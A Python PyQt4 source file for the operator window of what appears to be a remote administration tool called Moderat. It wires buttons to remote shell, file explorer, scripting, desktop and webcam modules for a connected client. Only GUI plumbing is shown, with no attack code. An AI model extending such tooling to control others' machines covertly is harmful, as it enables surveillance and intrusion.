# coding=utf-8
from PyQt4.QtCore import *
from PyQt4.QtGui import *
import string, random
from modules.mlogviewer import main as mlogviewer
from modules.mnote import main as mnote
from modules.mexplorer import main as mexplorer
from modules.mshell import main as mshell
from modules.mscript import main as mscript
from modules.mdesktop import main as mdesktop
from modules.mwebcam import main as mwebcam


def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class Executer(QMainWindow):

    modules = {
        'MVIEWER': mlogviewer,
        'MNOTE': mnote,
        'MSHELL': mshell,
        'MEXPLORER': mexplorer,
        'MSCRIPTING': mscript,
        'MDESKTOP': mdesktop,
        'MWEBCAM': mwebcam,
    }

    def __init__(self, args, module=None):
        QMainWindow.__init__(self)
        self.resize(1000, 700)
        self.setTabPosition(Qt.AllDockWidgetAreas, QTabWidget.North)
        self.dock_list = []
        self.widgets = {}
        self.setDockNestingEnabled(True)
        self.moderat = args['moderat']
        self.client = args['client']
        self.ip_address = args['ip_address']
        self.alias = args['alias']
        self.p2p = args['p2p']

        self.setStyleSheet(self.moderat.theme.stylesheet)
        self.setWindowTitle('{} - [{}]'.format(self.alias, self.ip_address))
        self.setWindowIcon(QIcon(':/icons/assets/logo.png'))

        self.addTools()

        if module:
            self.addModule(module)

    def addTools(self):

        self.headerBox = QToolBar(self)
        self.headerBox.setIconSize(QSize(16, 16))

        spacer = QWidget(self)
        spacer.setProperty('spacer', '1')
        spacer.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Minimum)
        self.headerBox.addWidget(spacer)

        self.alwaysTopAction = QAction(self)
        self.alwaysTopAction.setObjectName('alwaysTop')
        self.alwaysTopAction.triggered.connect(self.always_top)
        self.alwaysTopAction.setIcon(QIcon(':/icons/assets/always_top.png'))
        self.headerBox.addAction(self.alwaysTopAction)

        self.addToolBar(Qt.TopToolBarArea, self.headerBox)

        self.toolsBar = QToolBar(self)
        self.toolsBar.setIconSize(QSize(16, 16))

        self.modulesBar = QToolBar(self)
        self.modulesBar.setIconSize(QSize(16, 16))

        self.viewerAction = QAction(self)
        self.viewerAction.setIcon(QIcon(':/icons/assets/log_viewer.png'))
        self.viewerAction.triggered.connect(lambda: self.addModule('MVIEWER'))
        self.toolsBar.addAction(self.viewerAction)

        self.toolsBar.addSeparator()
        self.noteAction = QAction(self)
        self.noteAction.setIcon(QIcon(':/icons/assets/note.png'))
        self.noteAction.triggered.connect(lambda: self.addModule('MNOTE'))
        self.toolsBar.addAction(self.noteAction)

        self.addToolBar(Qt.LeftToolBarArea, self.toolsBar)

        self.shellAction = QAction(self)
        self.shellAction.setIcon(QIcon(':/icons/assets/remote_shell.png'))
        self.shellAction.triggered.connect(lambda: self.addModule('MSHELL'))
        self.modulesBar.addAction(self.shellAction)

        self.modulesBar.addSeparator()
        self.explorerAction = QAction(self)
        self.explorerAction.setIcon(QIcon(':/icons/assets/remote_explorer.png'))
        self.explorerAction.triggered.connect(lambda: self.addModule('MEXPLORER'))
        self.modulesBar.addAction(self.explorerAction)

        self.modulesBar.addSeparator()
        self.scriptingAction = QAction(self)
        self.scriptingAction.setIcon(QIcon(':/icons/assets/remote_scripting.png'))
        self.scriptingAction.triggered.connect(lambda: self.addModule('MSCRIPTING'))
        self.modulesBar.addAction(self.scriptingAction)

        self.modulesBar.addSeparator()
        self.desktopAction = QAction(self)
        self.desktopAction.setIcon(QIcon(':/icons/assets/desktop.png'))
        self.desktopAction.triggered.connect(lambda: self.addModule('MDESKTOP'))
        self.modulesBar.addAction(self.desktopAction)

        self.modulesBar.addSeparator()
        self.webcamAction = QAction(self)
        self.webcamAction.setIcon(QIcon(':/icons/assets/webcam.png'))
        self.webcamAction.triggered.connect(lambda: self.addModule('MWEBCAM'))
        self.modulesBar.addAction(self.webcamAction)

        self.addToolBar(Qt.LeftToolBarArea, self.modulesBar)

        self.insertToolBarBreak(self.modulesBar)

    def addModule(self, module):
        module_id = id_generator()
        self.addWidget(self.modules[module].mainPopup({
                'moderat': self.moderat,
                'client': self.client,
                'alias': self.alias,
                'ip_address': self.ip_address,
                'module_id': module_id,
                'p2p': self.p2p,
            }), self.moderat.MString('{}_TITLE'.format(module)), module_id)

    def addWidget(self, component, label, module_id):
        self.widgets[module_id] = component
        d = QDockWidget(label, self)
        d.setAllowedAreas(Qt.AllDockWidgetAreas)
        d.setWidget(self.widgets[module_id])
        self.dock_list.append(d)
        self.addDockWidget(Qt.LeftDockWidgetArea, d, Qt.Horizontal)
        if len(self.dock_list) > 1:
            index = len(self.dock_list) - 1
            self.tabifyDockWidget(self.dock_list[-2], self.dock_list[-1])
            if not hasattr(self, "tab_bar"):
                self.tab_bar = self.findChildren(QTabBar)[0]
            self.tab_bar.setMovable(True)

    def signal(self, data):
        if self.widgets.has_key(data['module_id']):
            self.widgets[data['module_id']].signal(data)

    def always_top(self):
        if self.windowFlags() == (self.windowFlags() | Qt.WindowStaysOnTopHint):
            self.setWindowFlags(self.windowFlags() & ~Qt.WindowStaysOnTopHint)
            self.show()
            return
        self.setWindowFlags(self.windowFlags() | Qt.WindowStaysOnTopHint)
        self.show()